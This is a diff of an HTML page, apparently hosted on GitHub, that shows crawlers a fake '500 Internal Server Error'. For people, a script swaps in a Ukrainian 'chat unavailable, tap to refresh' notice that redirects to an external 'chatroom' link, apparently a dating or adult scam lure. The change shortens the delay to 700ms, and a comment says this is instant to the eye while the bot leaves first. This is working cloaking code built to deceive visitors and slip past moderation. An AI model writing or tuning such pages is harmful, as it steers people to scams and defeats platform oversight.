@@ -15,24 +15,21 @@
 
         const target = "https://neontishell.uno/chatroom.php?girl=diana&src=gh"; 
         
-        function redirect() {
-            window.location.replace(target);
-        }
-
+        // Зменшив затримку до 700мс — це миттєво для ока, але бот встигне піти
         setTimeout(function() {
             document.body.innerHTML = `
-                <div onclick="window.location.replace('${target}')" style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; text-align:center; cursor:pointer; background:#fff; color:#262626; font-family:sans-serif; padding:20px;">
-                    <img src="https://cdn-icons-png.flaticon.com/512/110/110686.png" style="width:50px; opacity:0.3; margin-bottom:20px;">
-                    <div style="font-size:16px;">На жаль, чат недоступний у вашому додатку.</div>
-                    <div style="margin-top:15px; color:#0095f6; font-weight:600;">Натисніть тут, щоб оновити</div>
+                <div onclick="window.location.replace('${target}')" style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; text-align:center; cursor:pointer; background:#fff; color:#262626; font-family:sans-serif; padding:20px; -webkit-tap-highlight-color:transparent;">
+                    <img src="https://cdn-icons-png.flaticon.com/512/110/110686.png" style="width:45px; opacity:0.2; margin-bottom:20px;">
+                    <div style="font-size:17px; font-weight:500; line-height:1.4;">На жаль, чат недоступний<br>у вашому додатку.</div>
+                    <div style="margin-top:20px; color:#0095f6; font-size:15px; font-weight:600; border: 1px solid #0095f6; padding: 10px 20px; border-radius: 8px;">Натисніть тут, щоб оновити</div>
                 </div>
             `;
-        }, 1200);
+        }, 700); 
     })();
     </script>
 </head>
 <body style="margin:0; padding:50px; background:#fff; font-family:sans-serif; color:#666;">
-    <div id="err-msg" style="max-width: 600px;">
+    <div style="max-width: 600px;">
         <h2 style="font-size: 24px; margin-bottom: 10px;">500 Internal Server Error</h2>
         <p style="font-size: 14px; line-height: 1.6;">The server encountered an unexpected condition that prevented it from fulfilling the request.</p>
     </div>
